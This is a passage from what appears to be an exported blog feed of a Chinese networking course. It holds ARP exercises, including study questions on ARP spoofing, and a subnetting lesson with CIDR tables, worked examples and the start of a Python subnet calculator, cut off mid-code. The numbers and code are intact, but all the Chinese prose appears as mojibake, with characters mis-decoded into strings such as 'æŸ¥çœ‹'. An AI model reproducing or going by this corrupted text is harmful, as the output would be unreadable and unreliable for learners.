1ï¼šæŸ¥çœ‹æœ¬æœºä¿¡æ¯</h3><ol><li>æŸ¥çœ‹æœ¬æœºçš„MACåœ°å€</li><li>æŸ¥çœ‹æœ¬æœºçš„ARPç¼“å­˜</li><li>æ‰¾å‡ºè·¯ç”±å™¨çš„MACåœ°å€</li></ol><h3 id="ç»ƒä¹ 2ï¼šç†è§£ARP">ç»ƒä¹ 2ï¼šç†è§£ARP</h3><ol><li>ç”»å‡ºARPè¯·æ±‚å’Œå“åº”çš„å®Œæ•´è¿‡ç¨‹</li><li>è§£é‡Šä¸ºä»€ä¹ˆARPè¯·æ±‚ä½¿ç”¨å¹¿æ’­</li><li>ARPç¼“å­˜çš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿ</li></ol><h3 id="ç»ƒä¹ 3ï¼šå®è·µæ“ä½œ">ç»ƒä¹ 3ï¼šå®è·µæ“ä½œ</h3><ol><li>æ¸…ç©ºARPç¼“å­˜</li><li>Pingä¸€ä¸ªå±€åŸŸç½‘å†…çš„è®¾å¤‡</li><li>å†æ¬¡æŸ¥çœ‹ARPç¼“å­˜ï¼Œè§‚å¯Ÿå˜åŒ–</li></ol><h3 id="ç»ƒä¹ 4ï¼šå®‰å…¨æ€è€ƒ">ç»ƒä¹ 4ï¼šå®‰å…¨æ€è€ƒ</h3><ol><li>ä»€ä¹ˆæ˜¯ARPæ¬ºéª—ï¼ˆARP Spoofingï¼‰ï¼Ÿ</li><li>å¦‚ä½•é˜²èŒƒARPæ”»å‡»ï¼Ÿ</li><li>ä¸ºä»€ä¹ˆARPåè®®ä¸å®‰å…¨ï¼Ÿ</li></ol><hr><p>ğŸ’¡ <strong>ä»Šæ—¥é‡‘å¥</strong>ï¼šMACåœ°å€æ˜¯ç½‘ç»œä¸–ç•Œçš„èº«ä»½è¯ï¼</p><p>ğŸ‘‰ <a href="day09.md">ä¸Šä¸€å¤©ï¼šå­ç½‘åˆ’åˆ†å®æˆ˜</a> | <a href="../../README.md">è¿”å›ç›®å½•</a> | <a href="day11.md">ä¸‹ä¸€å¤©ï¼šç«¯å£å’ŒSocketæ·±å…¥</a></p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>9å¤©ï¼šå­ç½‘åˆ’åˆ†å®æˆ˜</title>
    <link href="/2025/11/10/9%E5%A4%A9%EF%BC%9A%E5%AD%90%E7%BD%91%E5%88%92%E5%88%86%E5%AE%9E%E6%88%98/"/>
    <url>/2025/11/10/9%E5%A4%A9%EF%BC%9A%E5%AD%90%E7%BD%91%E5%88%92%E5%88%86%E5%AE%9E%E6%88%98/</url>
    
    <content type="html"><![CDATA[<h1>ç¬¬9å¤©ï¼šå­ç½‘åˆ’åˆ†å®æˆ˜</h1><blockquote><p>â€œå­ç½‘åˆ’åˆ†å°±åƒæŠŠä¸€æ ‹å¤§æ¥¼åˆ†æˆä¸åŒçš„æˆ¿é—´ã€‚â€</p></blockquote><h2 id="ğŸ“š-ä»Šæ—¥ç›®æ ‡">ğŸ“š ä»Šæ—¥ç›®æ ‡</h2><ul><li>ç†è§£å­ç½‘æ©ç çš„æ¦‚å¿µå’Œä½œç”¨</li><li>æŒæ¡CIDRè¡¨ç¤ºæ³•</li><li>å­¦ä¼šè®¡ç®—ç½‘ç»œåœ°å€ã€å¹¿æ’­åœ°å€</li><li>èƒ½å¤Ÿè¿›è¡Œå­ç½‘åˆ’åˆ†</li><li>ç¼–å†™å­ç½‘è®¡ç®—å™¨å·¥å…·</li></ul><h2 id="ğŸ¯-ä¸ºä»€ä¹ˆéœ€è¦å­ç½‘åˆ’åˆ†ï¼Ÿ">ğŸ¯ ä¸ºä»€ä¹ˆéœ€è¦å­ç½‘åˆ’åˆ†ï¼Ÿ</h2><h3 id="ç”Ÿæ´»ä¸­çš„ä¾‹å­">ç”Ÿæ´»ä¸­çš„ä¾‹å­</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">æ²¡æœ‰å­ç½‘åˆ’åˆ†ï¼š<br>ä¸€æ ‹100å±‚çš„å¤§æ¥¼ï¼Œæ‰€æœ‰äººå…±ç”¨ä¸€ä¸ªé—¨ç‰Œå·<br>â†’ æ··ä¹±ã€éš¾ä»¥ç®¡ç†<br><br>æœ‰å­ç½‘åˆ’åˆ†ï¼š<br>æŠŠå¤§æ¥¼åˆ†æˆä¸åŒæ¥¼å±‚ï¼Œæ¯å±‚æœ‰è‡ªå·±çš„ç¼–å·<br>â†’ æ¸…æ™°ã€ä¾¿äºç®¡ç†<br><br>ç½‘ç»œä¹Ÿæ˜¯ä¸€æ ·ï¼š<br><span class="hljs-bullet">- </span>èŠ‚çœIPåœ°å€<br><span class="hljs-bullet">- </span>æé«˜ç½‘ç»œæ€§èƒ½<br><span class="hljs-bullet">- </span>å¢å¼ºå®‰å…¨æ€§<br><span class="hljs-bullet">- </span>ä¾¿äºç®¡ç†<br></code></pre></td></tr></table></figure><h3 id="å®é™…é—®é¢˜">å®é™…é—®é¢˜</h3><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">é—®é¢˜ï¼šä¸€ä¸ªå…¬å¸æœ‰<span class="hljs-number">500</span>å°ç”µè„‘ï¼Œç»™äº†ä¸€ä¸ª<span class="hljs-built_in">C</span>ç±»åœ°å€<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.0</span><br><br><span class="hljs-built_in">C</span>ç±»åœ°å€åªèƒ½å®¹çº³<span class="hljs-number">254</span>å°ä¸»æœºï¼ˆ<span class="hljs-number">2</span><span class="hljs-operator">^</span><span class="hljs-number">8</span> <span class="hljs-operator">-</span> <span class="hljs-number">2</span>ï¼‰<br><br>è§£å†³æ–¹æ¡ˆï¼š<br><span class="hljs-number">1.</span> ç”³è¯·å¤šä¸ª<span class="hljs-built_in">C</span>ç±»åœ°å€ï¼ˆæµªè´¹ã€ç®¡ç†å¤æ‚ï¼‰<br><span class="hljs-number">2.</span> ä½¿ç”¨<span class="hljs-variable">B</span>ç±»åœ°å€ï¼Œç„¶ååˆ’åˆ†å­ç½‘ï¼ˆæ¨èï¼‰<br></code></pre></td></tr></table></figure><h2 id="ğŸ“Š-å­ç½‘æ©ç ">ğŸ“Š å­ç½‘æ©ç </h2><h3 id="ä»€ä¹ˆæ˜¯å­ç½‘æ©ç ï¼Ÿ">ä»€ä¹ˆæ˜¯å­ç½‘æ©ç ï¼Ÿ</h3><p><strong>å­ç½‘æ©ç </strong>ï¼ˆSubnet Maskï¼‰ç”¨äºåŒºåˆ†IPåœ°å€ä¸­çš„ç½‘ç»œéƒ¨åˆ†å’Œä¸»æœºéƒ¨åˆ†ã€‚</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dns">IPåœ°å€ï¼š    <span class="hljs-number">192.168.1.100</span><br>å­ç½‘æ©ç ï¼š  <span class="hljs-number">255.255.255.0</span><br><br>ä½œç”¨ï¼šç¡®å®šå“ªäº›ä½æ˜¯ç½‘ç»œå·ï¼Œå“ªäº›ä½æ˜¯ä¸»æœºå·<br></code></pre></td></tr></table></figure><h3 id="å­ç½‘æ©ç çš„æ ¼å¼">å­ç½‘æ©ç çš„æ ¼å¼</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns">äºŒè¿›åˆ¶è¡¨ç¤ºï¼š<br>ç½‘ç»œéƒ¨åˆ†ï¼šå…¨æ˜¯<span class="hljs-number">1</span><br>ä¸»æœºéƒ¨åˆ†ï¼šå…¨æ˜¯<span class="hljs-number">0</span><br><br>ä¾‹å¦‚ï¼š<span class="hljs-number">255.255.255.0</span><br><span class="hljs-number">11111111</span>.<span class="hljs-number">11111111</span>.<span class="hljs-number">11111111</span>.<span class="hljs-number">00000000</span><br>[    ç½‘ç»œéƒ¨åˆ†ï¼ˆ<span class="hljs-number">24</span>ä½ï¼‰    ][ä¸»æœºéƒ¨åˆ†(<span class="hljs-number">8</span>ä½)]<br></code></pre></td></tr></table></figure><h3 id="å¸¸è§çš„å­ç½‘æ©ç ">å¸¸è§çš„å­ç½‘æ©ç </h3><table><thead><tr><th>ç±»åˆ«</th><th>é»˜è®¤å­ç½‘æ©ç </th><th>äºŒè¿›åˆ¶</th><th>CIDR</th></tr></thead><tbody><tr><td>Aç±»</td><td>255.0.0.0</td><td>11111111.00000000.00000000.00000000</td><td>/8</td></tr><tr><td>Bç±»</td><td>255.255.0.0</td><td>11111111.11111111.00000000.00000000</td><td>/16</td></tr><tr><td>Cç±»</td><td>255.255.255.0</td><td>11111111.11111111.11111111.00000000</td><td>/24</td></tr></tbody></table><h2 id="ğŸ”¢-CIDRè¡¨ç¤ºæ³•">ğŸ”¢ CIDRè¡¨ç¤ºæ³•</h2><h3 id="ä»€ä¹ˆæ˜¯CIDRï¼Ÿ">ä»€ä¹ˆæ˜¯CIDRï¼Ÿ</h3><p><strong>CIDR</strong>ï¼ˆClassless Inter-Domain Routingï¼Œæ— ç±»åŸŸé—´è·¯ç”±ï¼‰</p><p>ç”¨ <code>/æ•°å­—</code> è¡¨ç¤ºå­ç½‘æ©ç ï¼Œæ•°å­—è¡¨ç¤ºç½‘ç»œä½æ•°ã€‚</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dns">ä¼ ç»Ÿè¡¨ç¤ºï¼š<span class="hljs-number">192.168.1.0</span>  å­ç½‘æ©ç ï¼š<span class="hljs-number">255.255.255.0</span><br>CIDRè¡¨ç¤ºï¼š<span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span><br><br>/<span class="hljs-number">24</span> è¡¨ç¤ºå‰<span class="hljs-number">24</span>ä½æ˜¯ç½‘ç»œä½ï¼Œå<span class="hljs-number">8</span>ä½æ˜¯ä¸»æœºä½<br></code></pre></td></tr></table></figure><h3 id="CIDRå¯¹ç…§è¡¨">CIDRå¯¹ç…§è¡¨</h3><table><thead><tr><th>CIDR</th><th>å­ç½‘æ©ç </th><th>å¯ç”¨ä¸»æœºæ•°</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>/8</td><td>255.0.0.0</td><td>16,777,214</td><td>Aç±»é»˜è®¤</td></tr><tr><td>/16</td><td>255.255.0.0</td><td>65,534</td><td>Bç±»é»˜è®¤</td></tr><tr><td>/24</td><td>255.255.255.0</td><td>254</td><td>Cç±»é»˜è®¤</td></tr><tr><td>/25</td><td>255.255.255.128</td><td>126</td><td>Cç±»åˆ†2ä¸ªå­ç½‘</td></tr><tr><td>/26</td><td>255.255.255.192</td><td>62</td><td>Cç±»åˆ†4ä¸ªå­ç½‘</td></tr><tr><td>/27</td><td>255.255.255.224</td><td>30</td><td>Cç±»åˆ†8ä¸ªå­ç½‘</td></tr><tr><td>/28</td><td>255.255.255.240</td><td>14</td><td>Cç±»åˆ†16ä¸ªå­ç½‘</td></tr><tr><td>/29</td><td>255.255.255.248</td><td>6</td><td>Cç±»åˆ†32ä¸ªå­ç½‘</td></tr><tr><td>/30</td><td>255.255.255.252</td><td>2</td><td>ç‚¹å¯¹ç‚¹é“¾è·¯</td></tr></tbody></table><h3 id="è®¡ç®—å…¬å¼">è®¡ç®—å…¬å¼</h3><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs tap">ç½‘ç»œä½æ•°ï¼šn<br>ä¸»æœºä½æ•°ï¼š32 - n<br><br>å¯ç”¨ä¸»æœºæ•° = 2^(ä¸»æœºä½æ•°) - 2<br><br>å‡2çš„åŸå› ï¼š<br>- ç½‘ç»œåœ°å€ï¼ˆä¸»æœºä½å…¨0ï¼‰<br>- å¹¿æ’­åœ°å€ï¼ˆä¸»æœºä½å…¨1ï¼‰<br><br>ä¾‹å¦‚ï¼š/24<br>ä¸»æœºä½æ•° =<span class="hljs-number"> 32 </span>-<span class="hljs-number"> 24 </span>= 8<br>å¯ç”¨ä¸»æœºæ•° = 2^8 -<span class="hljs-number"> 2 </span>= 254<br></code></pre></td></tr></table></figure><h2 id="ğŸ§®-å­ç½‘åˆ’åˆ†è®¡ç®—">ğŸ§® å­ç½‘åˆ’åˆ†è®¡ç®—</h2><h3 id="åŸºæœ¬æ¦‚å¿µ">åŸºæœ¬æ¦‚å¿µ</h3><p><strong>ç½‘ç»œåœ°å€</strong>ï¼šä¸»æœºä½å…¨ä¸º0<br><strong>å¹¿æ’­åœ°å€</strong>ï¼šä¸»æœºä½å…¨ä¸º1<br><strong>ç¬¬ä¸€ä¸ªå¯ç”¨IP</strong>ï¼šç½‘ç»œåœ°å€ + 1<br><strong>æœ€åä¸€ä¸ªå¯ç”¨IP</strong>ï¼šå¹¿æ’­åœ°å€ - 1</p><h3 id="è®¡ç®—æ­¥éª¤">è®¡ç®—æ­¥éª¤</h3><h4 id="ä¾‹1ï¼š192-168-1-0-24">ä¾‹1ï¼š192.168.1.0/24</h4><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">1</span>. IPåœ°å€ï¼š<span class="hljs-number">192.168.1.0</span><br><span class="hljs-number">2</span>. å­ç½‘æ©ç ï¼š<span class="hljs-number">255.255.255.0</span> (/<span class="hljs-number">24</span>)<br><br>è®¡ç®—ï¼š<br>ç½‘ç»œåœ°å€ï¼š<span class="hljs-number">192.168.1.0</span><br>å¹¿æ’­åœ°å€ï¼š<span class="hljs-number">192.168.1.255</span><br>ç¬¬ä¸€ä¸ªå¯ç”¨IPï¼š<span class="hljs-number">192.168.1.1</span><br>æœ€åä¸€ä¸ªå¯ç”¨IPï¼š<span class="hljs-number">192.168.1.254</span><br>å¯ç”¨ä¸»æœºæ•°ï¼š<span class="hljs-number">254</span><br></code></pre></td></tr></table></figure><h4 id="ä¾‹2ï¼š192-168-1-0-25">ä¾‹2ï¼š192.168.1.0/25</h4><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">1</span>. IPåœ°å€ï¼š<span class="hljs-number">192.168.1.0</span><br><span class="hljs-number">2</span>. å­ç½‘æ©ç ï¼š<span class="hljs-number">255.255.255.128</span> (/<span class="hljs-number">25</span>)<br><br>åˆ†æï¼š<br>/<span class="hljs-number">25</span> è¡¨ç¤ºå‰<span class="hljs-number">25</span>ä½æ˜¯ç½‘ç»œä½ï¼Œå<span class="hljs-number">7</span>ä½æ˜¯ä¸»æœºä½<br><span class="hljs-number">255.255.255.128</span> = <span class="hljs-number">11111111</span>.<span class="hljs-number">11111111</span>.<span class="hljs-number">11111111</span>.<span class="hljs-number">10000000</span><br><br>å­ç½‘<span class="hljs-number">1</span>ï¼š<br>ç½‘ç»œåœ°å€ï¼š<span class="hljs-number">192.168.1.0</span><br>å¹¿æ’­åœ°å€ï¼š<span class="hljs-number">192.168.1.127</span><br>å¯ç”¨IPï¼š<span class="hljs-number">192.168.1.1</span> - <span class="hljs-number">192.168.1.126</span><br>å¯ç”¨ä¸»æœºæ•°ï¼š<span class="hljs-number">126</span><br><br>å­ç½‘<span class="hljs-number">2</span>ï¼š<br>ç½‘ç»œåœ°å€ï¼š<span class="hljs-number">192.168.1.128</span><br>å¹¿æ’­åœ°å€ï¼š<span class="hljs-number">192.168.1.255</span><br>å¯ç”¨IPï¼š<span class="hljs-number">192.168.1.129</span> - <span class="hljs-number">192.168.1.254</span><br>å¯ç”¨ä¸»æœºæ•°ï¼š<span class="hljs-number">126</span><br></code></pre></td></tr></table></figure><h3 id="å¿«é€Ÿè®¡ç®—æŠ€å·§">å¿«é€Ÿè®¡ç®—æŠ€å·§</h3><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">1</span>. æ‰¾åˆ°<span class="hljs-string">&quot;å˜åŒ–çš„å…«ä½&quot;</span><br>   <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">128</span> â†’ æœ€åä¸€ä¸ªå…«ä½æ˜¯<span class="hljs-number">128</span><br><br><span class="hljs-number">2</span>. è®¡ç®—å—å¤§å°<br>   å—å¤§å° = <span class="hljs-number">256</span> - å­ç½‘æ©ç æœ€åé<span class="hljs-number">0</span>çš„å…«ä½<br>   å—å¤§å° = <span class="hljs-number">256</span> - <span class="hljs-number">128</span> = <span class="hljs-number">128</span><br><br><span class="hljs-number">3</span>. åˆ—å‡ºå­ç½‘<br>   ç¬¬ä¸€ä¸ªå­ç½‘ï¼š<span class="hljs-number">0</span><br>   ç¬¬äºŒä¸ªå­ç½‘ï¼š<span class="hljs-number">0</span> + <span class="hljs-number">128</span> = <span class="hljs-number">128</span><br>   ç¬¬ä¸‰ä¸ªå­ç½‘ï¼š<span class="hljs-number">128</span> + <span class="hljs-number">128</span> = <span class="hljs-number">256</span>ï¼ˆè¶…å‡ºèŒƒå›´ï¼Œæ²¡æœ‰ç¬¬ä¸‰ä¸ªï¼‰<br><br>æ‰€ä»¥å­ç½‘æ˜¯ï¼š<br><span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">25</span><br><span class="hljs-number">192.168.1.128</span>/<span class="hljs-number">25</span><br></code></pre></td></tr></table></figure><h2 id="ğŸ”§-å®æˆ˜é¡¹ç›®ï¼šå­ç½‘è®¡ç®—å™¨">ğŸ”§ å®æˆ˜é¡¹ç›®ï¼šå­ç½‘è®¡ç®—å™¨</h2><p>è®©æˆ‘ä»¬ç¼–å†™ä¸€ä¸ªå¼ºå¤§çš„å­ç½‘è®¡ç®—å™¨ï¼</p><h3 id="ä»£ç å®ç°">ä»£ç å®ç°</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># day09_subnet_calculator.py</span><br><span class="hljs-comment"># åŠŸèƒ½ï¼šå­ç½‘è®¡ç®—å™¨</span><br><br><span class="hljs-keyword">import</span> math<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SubnetCalculator</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;å­ç½‘è®¡ç®—å™¨&quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">cidr_to_mask</span>(<span class="hljs-params">self, cidr</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        å°†CIDRè½¬æ¢ä¸ºå­ç½‘æ©ç </span><br><span class="hljs-string"></span><br><span class="hljs-string">        å‚æ•°ï¼š</span><br><span class="hljs-string">            cidr: CIDRå€¼ï¼ˆå¦‚24ï¼‰</span><br><span class="hljs-string"></span><br><span class="hljs-string">        è¿”å›ï¼š</span><br><span class="hljs-string">            å­ç½‘æ©ç å­—ç¬¦ä¸²ï¼ˆå¦‚ &quot;255.255.255.0&quot;ï¼‰</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-comment"># ç”Ÿæˆ32ä½äºŒè¿›åˆ¶ï¼Œå‰cidrä½æ˜¯1ï¼Œå…¶ä½™æ˜¯0</span><br>        binary = <span class="hljs-string">&#x27;1&#x27;</span> * cidr + <span class="hljs-string">&#x27;0&#x27;</span> * (<span class="hljs-number">32</span> - cidr)<br><br>        <span class="hljs-comment"># åˆ†æˆ4ç»„ï¼Œæ¯ç»„8ä½</span><br>        octets = [binary[i:i+<span class="hljs-number">8</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>, <span class="hljs-number">8</span>)]<br><br>        <span class="hljs-comment"># è½¬æ¢ä¸ºåè¿›åˆ¶</span><br>        mask = <span class="hljs-string">&#x27;.&#x27;</span>.join([<span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(octet, <span class="hljs-number">2</span>)) <span class="hljs-keyword">for</span> octet <span class="hljs-keyword">in</span> octets])<br><br>        <span class="hljs-keyword">return</span> mask<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">mask_to_cidr</span>(<span class="hljs-params">self, mask</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        å°†å­ç½‘æ©ç è½¬æ¢ä¸ºCIDR</span><br><span class="hljs-string"></span><br><span class="hljs-string">        å‚æ•°ï¼š</span><br><span class="hljs-string">            mask: å­ç½‘æ©ç å­—ç¬¦ä¸²ï¼ˆå¦‚ &quot;255.255.255.0&quot;ï¼‰</span><br><span class="hljs-string"></span><br><span class="hljs-string">        è¿”å›ï¼š</span><br><span class="hljs-string">            CIDRå€¼</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-comment"># è½¬æ¢ä¸ºäºŒè¿›åˆ¶</span><br>        binary = <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(x), <span class="hljs-string">&#x27;08b&#x27;</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> mask.split(<span class="hljs-string">&#x27;.&#x27;</span>)])<br><br>        <span class="hljs-comment"># è®¡ç®—1çš„ä¸ªæ•°</span><br>        <span class="hljs-keyword">return</span> binary.count(<span class="hljs-string">&#x27;1&#x27;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">ip_to_int</span>(<span class="hljs-params">self, ip</span>):<br>        <span 